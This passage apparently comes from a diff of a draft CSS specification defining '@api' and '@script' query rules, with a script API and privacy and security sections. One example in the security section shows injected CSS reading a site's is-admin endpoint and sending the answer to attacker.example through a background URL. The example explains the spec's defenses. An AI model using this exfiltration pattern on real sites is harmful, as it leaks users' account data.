+The <dfn attribute for=CSSAPIRule>name</dfn> and <dfn attribute for=CSSScriptRule>name</dfn> attributes return
+the rule's [=source name=]. The <dfn attribute for=CSSAPIRule>href</dfn> and
+<dfn attribute for=CSSScriptRule>href</dfn> attributes return its URL as written. The
+<dfn attribute for=CSSAPIRule>display</dfn> and <dfn attribute for=CSSScriptRule>display</dfn> attributes
+return its <<query-display>> keyword, or <code>"block"</code> if it has none. The
+<code>conditionText</code> of a {{CSSParamRule}} is its <<param-condition>>, serialized, and that of a
+{{CSSErrorRule}} is its parenthesized prelude, serialized.
+
+<h3 id=script-api>Reading answers from script</h3>
+
+Script reads a question's state the way it reads a web font's: with an object like <code>FontFace</code>, from a
+set like <code>document.fonts</code> [[CSS-FONT-LOADING-3]].
+
+<pre class=idl>
+partial interface Document {
+  [SameObject] readonly attribute ExternalQuerySet externalQueries;
+};
+
+[Exposed=Window]
+interface ExternalQuerySet {
+  ExternalQuery? get(CSSOMString name, (CSSOMString or double)... values);
+  readonly attribute Promise&lt;ExternalQuerySet> ready;
+};
+
+enum ExternalQueryStatus { "unasked", "pending", "true", "false", "error", "abandoned" };
+
+[Exposed=Window]
+interface ExternalQuery : EventTarget {
+  readonly attribute CSSOMString name;
+  readonly attribute FrozenArray&lt;(CSSOMString or double)> values;
+  readonly attribute ExternalQueryStatus status;
+  readonly attribute CSSOMString? error;
+  readonly attribute Promise&lt;boolean> answered;
+  attribute EventHandler onchange;
+};
+</pre>
+
+<dl>
+    <dt><dfn method for=ExternalQuerySet>get(name, ...values)</dfn>
+    <dd>
+        Returns the {{ExternalQuery}} for the question that a <<param-test>> with this name and these values
+        would ask, or null if no [=source declaration=] that counts declares the name. Strings are <<string>>
+        values and numbers are <<number>> values. The same question returns the same object for as long as the
+        name refers to the same source. Calling it doesn't ask the question.
+
+    <dt><dfn attribute for=ExternalQuerySet>ready</dfn>
+    <dd>
+        A promise that fulfills with the set once no question that the document's style sheets need is
+        [=test/state/pending=], like <code>document.fonts.ready</code>. When a question becomes pending after it
+        has fulfilled, the attribute returns a new promise.
+
+    <dt><dfn attribute for=ExternalQuery>status</dfn>
+    <dd>
+        <code>"unasked"</code> if no style sheet needs the question; <code>"abandoned"</code> if it was
+        [=test/abandoned=]; otherwise the test's [=test/state=]: <code>"pending"</code>, <code>"true"</code>,
+        <code>"false"</code>, or <code>"error"</code>.
+
+    <dt><dfn attribute for=ExternalQuery>error</dfn>
+    <dd>
+        The <<error-kind>> when {{ExternalQuery/status}} is <code>"error"</code>: <code>"unavailable"</code>,
+        <code>"invalid"</code>, <code>"timeout"</code>, or an HTTP status such as <code>"404"</code>. Null
+        otherwise.
+
+    <dt><dfn attribute for=ExternalQuery>answered</dfn>
+    <dd>
+        A promise for the question's first answer, like <code>FontFace.loaded</code>. It fulfills with true or
+        false when the source answers, rejects with a "<code>NetworkError</code>" {{DOMException}} if the test
+        ends in an error, and rejects with an "<code>AbortError</code>" {{DOMException}} if it is abandoned.
+        Later answers, after a refresh, are reported by <code>change</code> events.
+
+    <dt><dfn attribute for=ExternalQuery>onchange</dfn>
+    <dd>
+        A <code>change</code> event is fired at the {{ExternalQuery}} whenever its {{ExternalQuery/status}}
+        changes, during the same [=update the rendering=] that applies the change to style, at the step where
+        <code>MediaQueryList</code> <code>change</code> events are fired.
+</dl>
+
+<div class=example id=example-script-api>
+    <pre highlight=js>
+    const store = document.externalQueries.get("--store-open");
+    if (await store.answered) {
+      announce("The store is open now.");
+    }
+    store.addEventListener("change", () => console.log(store.status));
+    </pre>
+</div>
+
+These objects reveal nothing that page script can't already learn from the styles the answers change, with
+<code>getComputedStyle()</code>, and {{ExternalQuerySet/get()}} never asks a question that no style sheet asks.
+
+
+<h2 id=privacy>Privacy considerations</h2>
+
+<h3 id=privacy-requests>What an '@api' request reveals</h3>
+
+A style sheet can already make requests to any URL, with ''@import'' and with <<url>> values, and can make them
+only when a media query matches. An '@api' rule adds no new way to send information: its values are fixed in
+the style sheet, each question is asked once per document, and a question can't carry anything about an element,
+such as an attribute value. A request that is made only when an enclosing ''@media'' matches reveals that the
+media query matched, exactly as a background image under the same ''@media'' would.
+
+<h3 id=privacy-cookies>Credentials and tracking</h3>
+
+By default, requests carry cookies only to the document's own origin, so a cross-origin API can't answer
+differently for a user it recognizes from other sites.
+
+With <code>cross-origin(use-credentials)</code>, a request carries cookies to a cross-origin API too. The user
+agent's rules for third-party cookies still apply, and the answer is used only if the API allows credentials in
+its CORS response, naming the document's origin exactly. An image request already carries cookies under the same
+third-party rules, so this gives no new way to track a user; what it adds is that the API's answer for that user
+can change the page's style, which the API has to opt into.
+
+''referrer-policy()'' lets a page send less in the <code>Referer</code> header than its default policy does.
+
+<h3 id=privacy-without-script>Pages without script</h3>
+
+'@api' works when script is disabled. A server can already send different style sheets to different requests,
+so this changes what is convenient, not what is possible. A user agent that blocks remote resources, as many
+mail clients do, should treat every '@api' test as [=test/state/error=] ''@error/unavailable''.
+
+<h3 id=privacy-script>Query modules</h3>
+
+A [=query module=] runs with the page's own privileges and reads only what the page's script can read, so it
+exposes nothing new. It never runs where page script couldn't: not when scripting is disabled, not without a
+secure context, and not against the page's Content Security Policy.
+
+
+<h2 id=security>Security considerations</h2>
+
+<h3 id=security-api>Reading answers into style</h3>
+
+An answer changes style, and page script can read style with <code>getComputedStyle()</code>, so an answer is
+readable by the page. Cross-origin APIs therefore have to opt in with CORS, as web fonts do.
+
+That isn't enough for the page's own origin. If an attacker can inject CSS into a page, as through a style
+attribute or a user-supplied theme, they could ask the site's own APIs, which receive the user's cookies, and
+send the answer out by loading a <<url>> under '@param':
+
+<div class=example id=example-attack>
+    <pre highlight=css>
+    @api --admin url("/api/account/is-admin");
+    @param(--admin) { body { background: url(https://attacker.example/?admin) } }
+    </pre>
+</div>
+
+This is why answers need the <code>application/external-query+json</code> media type: ordinary APIs don't send
+it, so they never answer a style sheet. Every endpoint that does send it should assume that any CSS in the page,
+including injected CSS, can read its answers. ''@import'' guards against the same attack, reading a site's data
+as CSS, by refusing cross-origin responses that aren't served as <code>text/css</code>.
+
+<h3 id=security-values>Questions from any style sheet</h3>
+
+Any style sheet in the document can ask a declared source a question, including a third-party style sheet and
+injected CSS, and can choose the values. Endpoints and query modules should treat values as untrusted input, as
+they would treat query parameters from any request.
+
+Any style sheet can also declare a name again, and the last declaration wins, so a later style sheet can point
+another style sheet's questions at a different source. This only changes which styles apply, which a later style
+sheet can already do directly. It can't make a third-party style sheet load a query module, because only
+same-origin style sheets can declare one.
+
+<h3 id=security-script>Script started from CSS</h3>
+
+Until now, CSS couldn't start script. '@script' can, so injected CSS could try to use it to run code. Defenses:
+
+* Only style sheets with the document's origin can declare a query module, so a third-party style sheet, such
+    as one from a CDN or a theme marketplace, can't.
+* The module is checked against [=script-src=] like any module script. It carries no nonce, and
+    <code>&#39;strict-dynamic&#39;</code> doesn't trust it, so a page with a nonce-based policy must allow each
+    query module by URL or by hash.
+* ''integrity()'' pins a module to known contents, so a changed or compromised host, such as a CDN, can't
+    swap in other code.
+* A page whose policy allows scripts only by hash allows exactly the query modules it lists. Injected CSS can
+    declare other modules, but they won't run.
+* Nothing runs when scripting is disabled or without a secure context.
+
+What remains: on a page whose policy allows scripts by URL, such as with <code>&#39;self&#39;</code>, CSS
+injected into a same-origin style sheet can declare and ask any module the policy allows, which runs that
+module's top-level code. A module written for other purposes may do something harmful when it runs.
+
+A query module doesn't have to opt in to being loaded from CSS, for example with a response header. This follows
+<code>&lt;script type=module></code> and <code>CSS.paintWorklet.addModule()</code>, which ask nothing of a module
+beyond being served as JavaScript and passing the page's policy. A page that wants tighter control allows its
+query modules by hash and declares them with ''integrity()''.
+
+<h3 id=security-dos>Many questions</h3>
+
+Each distinct set of values is a request or a call. A style sheet can already make many requests with <<url>>
+values. A user agent may limit the number of tests for each source, and treat tests past the limit as
+[=test/state/error=] ''@error/unavailable''.
+
+
+<h2 id=alternate-proposals>Alternate proposals</h2>
+
+<h3 id=alt-nested>Sources wrapped around their questions</h3>
+
+An earlier draft put the questions inside the source:
+
+<div class=example id=example-alt-nested>
+    <pre highlight=css>
+    @api url("https://moon.example/phase") {
+      @param("full") { … }
+      @error(404) { … }
+    }
+    </pre>
+</div>
+
+It keeps a source and its questions together, but it can't ask two sources in one condition except by nesting
+one inside the other, which can only mean "and". ''param()'' needed a source around it, so style rules directly
+inside the source had to apply unconditionally, and ''param()'' anywhere else had to be false. Named sources
+follow ''@custom-media'', ''@font-face'', and ''@keyframes'': declare a name once, use it anywhere.
+
+<h3 id=alt-registered>Sources registered by page script</h3>
+
+Instead of CSS loading a module, page script could declare a source:
+
+<div class=example id=example-alt-registered>
+    <pre highlight=js>
+    CSS.externalQueries.define("--moon-calc", (name) => phaseOn(new Date()) === name);
+    </pre>
+    <pre highlight=css>
+    @param(--moon-calc, "full") { … }
+    </pre>
+</div>
+
+This is the direction the CSS Working Group has taken whenever script has fed media queries: the long-standing
+issue for script-based custom media queries in [[MEDIAQUERIES-5]] sets values with
+<code>CSS.customMedia.set()</code>, and the script control of user preferences that the group adopted in 2024
+sets them with <code>navigator.preferences</code>. In both, page script pushes a value and CSS never loads
+code, which closes [[#security-script]] entirely.
+
+It wasn't chosen because it loses the timing: the page's script has to load and run before CSS can ask, so a
+style sheet can't wait a short, fixed time for the answer the way it waits for a web font. A query that isn't
+defined yet is unknown, and the CSS Working Group's discussion of script-defined media queries found the same
+problem, that without script such a query is never true. Because questions use only names, this could be added
+later beside '@script' without changing how questions are asked.
+
+<h3 id=alt-match-response>Matching the response instead of asking for each value</h3>
+
+An '@api' source could be fetched once and its response compared to each '@param' value, like a switch. That
+needs one request instead of one per value, and works with existing APIs that return a value. It wasn't chosen
+because every question in this specification has a true-or-false answer, which keeps '@api' and '@script' the
+same, and lets a source answer questions a fixed value can't, such as
+<code>@param(--moon, "between", 10, 20)</code>.
+
+<h3 id=alt-batching>Several questions in one request</h3>
+
+A user agent could send all the questions for one '@api' source in one request and get back an answer for each.
+That would save requests when a page asks one source many questions. It wasn't chosen because:
+
+* Web fonts don't do it. Each ''@font-face'' file is its own request, fetched only when the page uses it, even
+    when a family is split into many files.
+* HTTP/2 and HTTP/3 already send many small requests over one connection.
+* Every endpoint would have to accept a second request and response format, and a question's answer would
+    depend on which other questions happened to be asked with it, which also makes answers harder to cache.
+
+<h3 id=alt-media>Media features</h3>
+
+The questions could be media features, as in <code>@media (--moon-phase: "full")</code>, which would also work
+in <code>matchMedia()</code> and HTML <code>media</code> attributes. Media queries are answered at once, from
+the state of the device, everywhere they appear; an answer that arrives seconds later from a network or a script
+doesn't fit them.
+
+<h3 id=alt-worklet>Query modules in a worklet</h3>
+
+A query module could run in a worklet, as paint worklets do, isolated from the page. It couldn't loop with style
+or read the page's state, which removes [[#cycles]] and most of [[#security-script]]. It wasn't chosen because
+reading the page's state is what most query modules are for.
+
+
+<h2 id=open-issues>Open issues</h2>
+
+<div class=issue id=issue-stop-loops>
+    How should a test whose answer keeps flipping be handled, and does it need a way to stop? This needs more
+    discussion.
+
+    **Option 1: no stop.** This draft follows <code>ResizeObserver</code> ([[#script-refresh]]): a flipping test
+    is asked at most once per frame, forever, and reported to the developer console. The page never hangs, and no
+    test that legitimately changes often, such as one that follows an animation, is ever cut off by mistake. The
+    cost is that a buggy test can make the page flicker for as long as it is open, and the author learns about it
+    only from the console.
+
+    **Option 2: a way to stop.** This would need answers to three questions.
+
+    **Who stops it?**
+
+    * The user agent, after a test's answer has changed in each of a set number of consecutive renderings. For
+        example, 10 renderings is about a sixth of a second at 60 frames per second. This needs no author action,
+        but any fixed number is a guess, and a test that legitimately changes every frame, such as one that
+        follows an animation, would be stopped by mistake.
+    * The author, with a limit on the declaration: <code>@script --x url("/q.js" max-changes(10/1s));</code>,
+        or a keyword such as <code>once</code>, which ignores refreshes altogether. This puts the choice with
+        the person who knows what the module does, but most authors won't know a loop is possible until they see
+        one.
+    * The module, which already receives an <code>AbortSignal</code> in <code>watch()</code>. The user agent
+        could abort it with a <code>"loop"</code> reason, telling the module to stop calling
+        <var>refresh</var>, while leaving the decision about what to do to the module.
+
+    **What does the test show once stopped?**
+
+    * Its last answer: the page stops changing, but which of the two states it stops in is a matter of timing.
+    * False: predictable, but it may be the wrong state.
+    * An error, with a new <<error-kind>> such as <code>loop</code>: neither '@param' nor its
+        <code>not</code> applies, and <code>@error(--x, loop)</code> can style a fallback on purpose. This
+        fits how this specification already treats every other failure.
+
+    **Can it start again?** A stopped test could stay stopped for the rest of the document, or be asked again
+    after the next explicit <var>refresh</var> that follows a pause of, say, one second.
+
+    These pieces can be combined in several ways. For example, the user agent could stop a test after a number of
+    consecutive changes, set it to an error with the kind <code>loop</code>, and abort the module's
+    <code>watch()</code> signal with the reason <code>"loop"</code>. Or the author could opt in with a limit on
+    the declaration, and tests without one would behave as in Option 1.
+</div>
+<h2 id=questionnaire class=no-num>Appendix: Security and privacy questionnaire</h2>
+
+*This section is non-normative.* These are the answers to the questions in
+[[SECURITY-PRIVACY-QUESTIONNAIRE]].
+
+: What information does this feature expose, and for what purposes?
+:: To a style sheet, true-or-false answers from an API or from the page's own script, so the page can be styled
+    by them.
+: Do features in your specification expose the minimum amount of information necessary?
+:: Yes. Each answer is one bit, and an '@api' request carries only values written in a style sheet.
+: Do the features expose personal information, PII, or information derived from either?
+:: Only what the API or the page's script chooses to answer.
+: How do the features deal with sensitive information?
+:: Answers from the page's own origin are limited to endpoints that serve the external query media type. See
+    [[#security-api]].
+: Does data exposed carry related but distinct information that may not be obvious to users?
+:: An '@api' request under an ''@media'' rule reveals that the media query matched, as any conditional request
+    does.
+: Do the features introduce state that persists across browsing sessions?
+:: No. Answers last for one document.
+: Do the features expose information about the underlying platform to origins?
+:: No.
+: Does this specification allow an origin to send data to the underlying platform?
+:: No.
+: Do features enable access to device sensors?
+:: No.
+: Do features enable new script execution or loading mechanisms?
+:: Yes. '@script' loads and runs a JavaScript module from a style sheet. See [[#security-script]].
+: Do features allow an origin to access other devices?
+:: No.
+: Do features allow an origin some measure of control over a user agent's native UI?
+:: No.
+: What temporary identifiers do the features create or expose to the web?
+:: None.
+: How does this specification distinguish between behavior in first-party and third-party contexts?
+:: Cross-origin APIs must opt in with CORS, and receive cookies only with
+    <code>cross-origin(use-credentials)</code>, under the user agent's third-party cookie rules. Third-party
+    style sheets can't declare query modules.
+: How do the features work in the context of a browser's Private Browsing or Incognito mode?
+:: The same way.
+: Does this specification have both "Security Considerations" and "Privacy Considerations" sections?
+:: Yes.
+: Do features enable origins to downgrade default security protections?
+:: No.
+: What happens when a document that uses your feature is kept alive in BFCache?
+:: Answers are kept. A query module's refreshes resume when the document is restored.
+: What happens when a document that uses your feature gets disconnected?
+:: Nothing is kept.
+: Does your spec define when and how new kinds of errors should be raised?
+:: It defines when a test is in an error state, which '@error' rules can style. The
+    {{ExternalQuery/answered}} promise then rejects with a "<code>NetworkError</code>" or, for an abandoned test,
+    an "<code>AbortError</code>" {{DOMException}}. Nothing is thrown.
+: Does your feature allow sites to learn about the user's use of assistive technology?
+:: No.
+: What should this questionnaire have asked?
+:: Whether a feature lets a language that couldn't run script start it.
